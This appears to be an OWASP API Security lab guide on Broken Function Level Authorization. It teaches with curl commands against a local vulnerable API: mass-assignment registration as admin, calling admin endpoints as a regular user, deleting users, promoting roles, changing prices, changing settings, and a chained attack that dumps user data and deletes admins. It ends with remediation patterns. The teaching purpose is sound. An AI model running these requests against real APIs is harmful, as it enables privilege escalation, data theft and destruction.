# API05: Broken Function Level Authorization - Lab Instructions

## Overview

This hands-on lab teaches you about **Broken Function Level Authorization (BFLA)** vulnerabilities. You'll learn how attackers exploit missing or improperly implemented authorization checks to access privileged functions.

## Learning Objectives

By completing this lab, you will:

- Understand the difference between authentication and authorization
- Identify function-level authorization vulnerabilities
- Exploit admin endpoints without proper role checks
- Learn about mass assignment vulnerabilities
- Understand HTTP method-based authorization gaps
- Discover hidden administrative endpoints
- Learn proper authorization implementation patterns

## Lab Setup

### Prerequisites

- Docker and Docker Compose installed
- Basic understanding of HTTP and REST APIs
- Familiarity with curl or Postman (optional)

### Starting the Lab

```bash
# Navigate to the lab directory
cd OWASP-API/API05-Broken-Function-Level-Authorization/lab/api05-function-auth-lab

# Start the vulnerable API
docker-compose up

# The API will be available at http://localhost:5000
```

### Test Accounts

| Username | Password    | Role  | Purpose |
|----------|-------------|-------|---------|
| alice    | password123 | user  | Regular user for testing |
| bob      | password123 | user  | Another regular user |
| admin    | admin123    | admin | Administrator account |

## Exercise 1: Mass Assignment - Role Escalation via Registration

### Objective
Discover if you can register with elevated privileges.

### Background
Many applications accept JSON payloads for user registration. If the backend doesn't properly validate or filter input fields, attackers can inject additional parameters like `role` or `is_admin`.

### Steps

1. **Open the web interface**: Navigate to http://localhost:5000

2. **Examine the registration form**: Notice there's a "Role" field in the registration section

3. **Register a new user with admin role**:

   Using the web interface:
   - Username: `hacker`
   - Password: `password123`
   - Email: `hacker@evil.com`
   - Role: `admin` (try setting this!)
   - Click "Register"

4. **Or use curl**:

   ```bash
   curl -X POST http://localhost:5000/api/register \
     -H "Content-Type: application/json" \
     -d '{
       "username": "hacker",
       "password": "password123",
       "email": "hacker@evil.com",
       "role": "admin"
     }'
   ```

5. **Check the response**: Look at the returned user object. What role does it have?

6. **Verify admin access**: Log in as your new user and try accessing admin endpoints

### Questions

- ❓ Were you able to register as an admin?
- ❓ What field in the request allowed this?
- ❓ Why is this dangerous?
- ❓ How should registration be implemented securely?

### Impact

If successful, this vulnerability allows:
- Instant privilege escalation
- Bypassing normal approval processes
- Unauthorized access to all admin functions

---

## Exercise 2: Admin Endpoint Access Without Authorization

### Objective
Determine if regular users can access administrative endpoints.

### Background
Admin endpoints often exist at paths like `/admin/` or `/api/admin/`. If these endpoints only check authentication (is user logged in?) but not authorization (does user have admin role?), any authenticated user can access them.

### Steps

1. **Log in as a regular user (Alice)**:

   Web interface:
   - Click on "Alice" quick login button
   - Or manually login with alice/password123

   Using curl:
   ```bash
   # Login and save the token
   TOKEN=$(curl -s -X POST http://localhost:5000/api/login \
     -H "Content-Type: application/json" \
     -d '{"username":"alice","password":"password123"}' \
     | jq -r '.token')
   ```

2. **Try accessing the admin users endpoint**:

   Web interface:
   - Click "GET /api/admin/users" button

   Using curl:
   ```bash
   curl -H "Authorization: Bearer $TOKEN" \
     http://localhost:5000/api/admin/users
   ```

3. **What do you see?**
   - Can Alice (a regular user) see all users with full details?
   - Compare the response to `/api/users` (public endpoint)

4. **Try other admin endpoints**:

   ```bash
   # Audit log (should be admin-only)
   curl -H "Authorization: Bearer $TOKEN" \
     http://localhost:5000/api/admin/audit-log
   
   # Debug endpoint (should not exist in production!)
   curl -H "Authorization: Bearer $TOKEN" \
     http://localhost:5000/api/debug/users
   ```

### Questions

- ❓ Can regular users access `/api/admin/users`?
- ❓ What sensitive information is exposed?
- ❓ What other admin endpoints can you discover?
- ❓ How can you differentiate between authentication and authorization?

### Impact

This vulnerability allows:
- Data enumeration (all users' information)
- Discovery of admin capabilities
- Information gathering for further attacks

---

## Exercise 3: Unauthorized User Deletion

### Objective
Test if non-admin users can delete other users.

### Background
DELETE operations should typically be restricted to administrators. If the endpoint exists but lacks proper authorization checks, regular users can delete accounts.

### Steps

1. **Ensure you're logged in as Alice** (regular user)

2. **Attempt to delete Bob's account (user ID 2)**:

   Web interface:
   - Enter "2" in the "User ID to delete" field
   - Click "DELETE /api/admin/users/:id"

   Using curl:
   ```bash
   # As Alice, try to delete Bob (user ID 2)
   curl -X DELETE \
     -H "Authorization: Bearer $TOKEN" \
     http://localhost:5000/api/admin/users/2
   ```

3. **Check if it succeeded**:

   ```bash
   # Try to get Bob's account
   curl -H "Authorization: Bearer $TOKEN" \
     http://localhost:5000/api/users/2
   ```

4. **Check the audit log**:

   ```bash
   curl -H "Authorization: Bearer $TOKEN" \
     http://localhost:5000/api/admin/audit-log
   ```

### Questions

- ❓ Were you able to delete Bob's account as Alice?
- ❓ What HTTP status code did you receive?
- ❓ Was the action logged? Who was recorded as the actor?
- ❓ What would happen if an attacker iterated through all user IDs?

### Impact

This vulnerability enables:
- Account takeover (delete target, recreate with attacker's email)
- Denial of service (mass user deletion)
- Data destruction
- Business disruption

---

## Exercise 4: Privilege Escalation via Role Modification

### Objective
Determine if users can modify their own or others' roles.

### Background
Role modification should be a highly restricted operation. If regular users can change roles, they can grant themselves admin privileges.

### Steps

1. **As Alice, try to promote Bob to admin**:

   Web interface:
   - Enter "2" in "User ID to promote"
   - Click "PUT /api/admin/users/:id/role (to admin)"

   Using curl:
   ```bash
   curl -X PUT \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"role":"admin"}' \
     http://localhost:5000/api/admin/users/2/role
   ```

2. **Try to promote yourself**:

   First, get your user ID:
   ```bash
   curl -H "Authorization: Bearer $TOKEN" \
     http://localhost:5000/api/users/me | jq '.id'
   ```

   Then promote yourself:
   ```bash
   curl -X PUT \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"role":"admin"}' \
     http://localhost:5000/api/admin/users/1/role
   ```

3. **Verify the role change**:

   ```bash
   curl -H "Authorization: Bearer $TOKEN" \
     http://localhost:5000/api/users/me
   ```

4. **Get a new token with admin role**:

   ```bash
   # Logout and login again to get fresh token
   curl -X POST http://localhost:5000/api/login \
     -H "Content-Type: application/json" \
     -d '{"username":"alice","password":"password123"}'
   ```

### Questions

- ❓ Were you able to change Bob's role?
- ❓ Could you promote yourself to admin?
- ❓ After promoting yourself, what additional access do you have?
- ❓ Why is role management a critical function?

### Impact

Successful exploitation allows:
- Complete privilege escalation
- Persistent admin access
- Ability to create additional admin accounts
- Full system compromise

---

## Exercise 5: HTTP Method Tampering

### Objective
Discover authorization gaps between different HTTP methods on the same endpoint.

### Background
Developers sometimes implement authorization for read operations (GET) but forget to protect write operations (PUT, DELETE) on the same resource.

### Steps

1. **As Alice, view a product** (this should work):

   ```bash
   curl -H "Authorization: Bearer $TOKEN" \
     http://localhost:5000/api/products/1
   ```

2. **Try to update the product price to $0.01**:

   Web interface:
   - Product ID: 1
   - New Price: 0.01
   - Click "PUT /api/products/:id"

   Using curl:
   ```bash
   curl -X PUT \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"price":0.01}' \
     http://localhost:5000/api/products/1
   ```

3. **Verify the price change**:

   ```bash
   curl -H "Authorization: Bearer $TOKEN" \
     http://localhost:5000/api/products/1
   ```

4. **Try to delete a product**:

   ```bash
   curl -X DELETE \
     -H "Authorization: Bearer $TOKEN" \
     http://localhost:5000/api/products/2
   ```

### Questions

- ❓ Can regular users modify product prices?
- ❓ Can they delete products?
- ❓ Why might GET be protected differently than PUT/DELETE?
- ❓ What's the business impact of price manipulation?

### Impact

This vulnerability can lead to:
- Financial fraud (setting prices to $0)
- Inventory manipulation
- Product deletion (DoS)
- Economic damage

---

## Exercise 6: Hidden Endpoint Discovery

### Objective
Find and exploit undocumented or debug endpoints.

### Background
Applications often have hidden administrative or debug endpoints that aren't documented. These might include `/debug`, `/internal`, `/api/v2`, etc.

### Steps

1. **Check the info endpoint to see available endpoints**:

   ```bash
   curl http://localhost:5000/api/info | jq '.endpoints'
   ```

2. **Try the debug endpoint**:

   ```bash
   curl -H "Authorization: Bearer $TOKEN" \
     http://localhost:5000/api/debug/users
   ```

3. **What information is exposed?**
   - Compare to the regular `/api/users` endpoint
   - Look for sensitive fields (passwords, hashes, etc.)

4. **Try common debug/admin paths**:

   ```bash
   # These might exist in real applications
   curl -H "Authorization: Bearer $TOKEN" http://localhost:5000/api/internal/config
   curl -H "Authorization: Bearer $TOKEN" http://localhost:5000/api/v2/admin/users
   curl -H "Authorization: Bearer $TOKEN" http://localhost:5000/api/console
   ```

### Questions

- ❓ What does `/api/debug/users` expose that normal endpoints don't?
- ❓ How could an attacker discover these endpoints?
- ❓ Should debug endpoints exist in production?

### Impact

Debug endpoints often expose:
- Full database dumps
- Password hashes
- System configuration
- Internal architecture details
- Sensitive business data

---

## Exercise 7: Settings Manipulation

### Objective
Test if regular users can view or modify system settings.

### Background
System settings control application behavior and should be admin-only. If accessible to regular users, they can disable security features, enable debug mode, or disrupt service.

### Steps

1. **View system settings** (as Alice):

   Web interface:
   - Click "GET /api/settings"

   Using curl:
   ```bash
   curl -H "Authorization: Bearer $TOKEN" \
     http://localhost:5000/api/settings
   ```

2. **Try to modify settings**:

   ```bash
   curl -X PUT \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"maintenance_mode":true,"registration_enabled":false}' \
     http://localhost:5000/api/settings
   ```

3. **Verify the changes**:

   ```bash
   curl -H "Authorization: Bearer $TOKEN" \
     http://localhost:5000/api/settings
   ```

4. **Try to enable debug features**:

   ```bash
   curl -X PUT \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"debug_mode":true}' \
     http://localhost:5000/api/settings
   ```

### Questions

- ❓ Can regular users view system settings?
- ❓ Can they modify critical settings?
- ❓ What could an attacker do with maintenance mode?
- ❓ What's the impact of disabling registration?

### Impact

Settings manipulation can:
- Enable maintenance mode (DoS)
- Disable security features
- Change business rules
- Expose debug information
- Modify rate limits

---

## Exercise 8: Bulk Operations

### Objective
Exploit bulk administrative operations.

### Background
Bulk operations (batch delete, bulk update) are typically admin-only features. Without proper authorization, regular users can cause mass destruction.

### Steps

1. **Attempt bulk user deletion** (as Alice):

   ```bash
   curl -X POST \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"user_ids":[2]}' \
     http://localhost:5000/api/admin/users/bulk-delete
   ```

2. **Try to delete multiple users at once**:

   ```bash
   # First, check existing users
   curl -H "Authorization: Bearer $TOKEN" \
     http://localhost:5000/api/admin/users | jq '[.[] | .id]'
   
   # Try to delete multiple (be careful with this!)
   curl -X POST \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"user_ids":[2]}' \
     http://localhost:5000/api/admin/users/bulk-delete
   ```

3. **Check the audit log**:

   ```bash
   curl -H "Authorization: Bearer $TOKEN" \
     http://localhost:5000/api/admin/audit-log | jq '.[] | select(.action=="bulk_delete_users")'
   ```

### Questions

- ❓ Can regular users perform bulk deletions?
- ❓ How many users can be deleted at once?
- ❓ Is there any rate limiting or validation?
- ❓ What's the maximum damage a single request can cause?

### Impact

Bulk operation exploits enable:
- Mass data deletion
- Rapid privilege escalation (bulk role changes)
- Wholesale configuration changes
- Large-scale service disruption

---

## Exercise 9: Chaining Vulnerabilities

### Objective
Combine multiple vulnerabilities for maximum impact.

### Background
Real-world attacks often chain multiple vulnerabilities. Combining BFLA with other weaknesses creates powerful exploitation paths.

### Attack Chain Example

1. **Register with admin role** (Mass Assignment):
   ```bash
   curl -X POST http://localhost:5000/api/register \
     -H "Content-Type: application/json" \
     -d '{
       "username": "attacker",
       "password": "password123",
       "email": "attacker@evil.com",
       "role": "admin"
     }' | jq '.token' -r > token.txt
   
   ADMIN_TOKEN=$(cat token.txt)
   ```

2. **Use admin access to exfiltrate all user data**:
   ```bash
   curl -H "Authorization: Bearer $ADMIN_TOKEN" \
     http://localhost:5000/api/admin/users > all_users.json
   ```

3. **Modify product prices**:
   ```bash
   # Change all products to $0.01
   for id in 1 2 3; do
     curl -X PUT \
       -H "Authorization: Bearer $ADMIN_TOKEN" \
       -H "Content-Type: application/json" \
       -d '{"price":0.01}' \
       http://localhost:5000/api/products/$id
   done
   ```

4. **Enable maintenance mode**:
   ```bash
   curl -X PUT \
     -H "Authorization: Bearer $ADMIN_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"maintenance_mode":true}' \
     http://localhost:5000/api/settings
   ```

5. **Delete all other admins**:
   ```bash
   # Get all admin user IDs
   ADMIN_IDS=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
     http://localhost:5000/api/admin/users \
     | jq -r '[.[] | select(.role=="admin" and .username!="attacker") | .id]')
   
   # Bulk delete them
   curl -X POST \
     -H "Authorization: Bearer $ADMIN_TOKEN" \
     -H "Content-Type: application/json" \
     -d "{\"user_ids\":$ADMIN_IDS}" \
     http://localhost:5000/api/admin/users/bulk-delete
   ```

### Questions

- ❓ What was the final impact of this attack chain?
- ❓ Could this attack be performed completely automatically?
- ❓ How long would it take to detect this in a real system?
- ❓ What makes chained attacks more dangerous?

---

## Remediation Exercise

### Objective
Understand how to properly fix BFLA vulnerabilities.

### Steps

1. **Review the vulnerable code** in `app/server.py`

2. **Identify the flaws**:
   - Where are authorization checks missing?
   - What functions accept untrusted input?
   - Which endpoints have method-specific issues?

3. **Review the secure implementation** in `solution/server_secure.py`

4. **Compare the differences**:

   ```bash
   diff app/server.py solution/server_secure.py
   ```

5. **Key security improvements to notice**:
   - `@admin_required` decorator added
   - Field whitelisting in registration
   - Role assignment server-side only
   - Method-specific authorization
   - Debug endpoints removed
   - Consistent authorization across all admin functions

### Secure Implementation Patterns

```python
# Pattern 1: Role-based decorator
@admin_required
def admin_function():
    pass

# Pattern 2: Field whitelisting
allowed_fields = {'username', 'email', 'password'}
data = {k: v for k, v in request.json.items() if k in allowed_fields}

# Pattern 3: Server-assigned privileges
user.role = 'user'  # Never user.role = request.json.get('role')

# Pattern 4: Method-specific routes
@app.route('/api/users/<id>', methods=['GET'])
def get_user(id):
    # Read authorization

@app.route('/api/users/<id>', methods=['DELETE'])
@admin_required
def delete_user(id):
    # Write authorization
```

---

## Summary and Key Takeaways

### Vulnerabilities Discovered

1. ✅ **Mass Assignment**: Role parameter in registration
2. ✅ **Missing Authorization**: Admin endpoints accessible to all
3. ✅ **Method Tampering**: PUT/DELETE without role checks
4. ✅ **Hidden Endpoints**: Debug endpoints exposing sensitive data
5. ✅ **Settings Access**: System configuration modifiable by users
6. ✅ **Audit Log Exposure**: Security logs readable by anyone
7. ✅ **Bulk Operations**: Mass deletion without admin check

### Security Principles Learned

1. **Authentication ≠ Authorization**
   - Authentication: Who are you?
   - Authorization: What can you do?

2. **Default Deny**
   - Explicitly grant permissions
   - Don't assume restrictions

3. **Server-Side Enforcement**
   - Never trust client input
   - Validate everything server-side

4. **Consistent Authorization**
   - Check permissions on every endpoint
   - Don't forget different HTTP methods

5. **Principle of Least Privilege**
   - Users should have minimum necessary permissions
   - Require explicit elevation for privileged operations

### Real-World Impact

Function-level authorization vulnerabilities have led to:

- **Financial losses**: Unauthorized refunds, price manipulation
- **Data breaches**: Access to customer PII, business data
- **Account takeovers**: User deletion and recreation
- **Service disruption**: System settings manipulation
- **Regulatory fines**: GDPR, HIPAA violations

### Prevention Checklist

- [ ] Implement role-based access control (RBAC)
- [ ] Use authorization decorators/middleware consistently
- [ ] Never trust client-provided role/permission data
- [ ] Whitelist allowed fields in requests
- [ ] Separate routes for different authorization levels
- [ ] Remove debug endpoints from production
- [ ] Test with multiple user roles
- [ ] Implement proper audit logging
- [ ] Use the principle of least privilege
- [ ] Regular security code reviews

## Additional Resources

- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [Prevention Guide](../../prevention.md)
- [Attack Vectors](../../attack-vectors.md)
- [Code Examples](../../examples.md)

## Next Steps

1. Try the attack scripts in `attacks/` directory
2. Review the secure implementation in `solution/`
3. Practice implementing proper authorization in your own projects
4. Explore other API security labs in this repository

---

**Remember**: This lab is for educational purposes only. Never test these techniques on systems you don't own or have explicit permission to test.
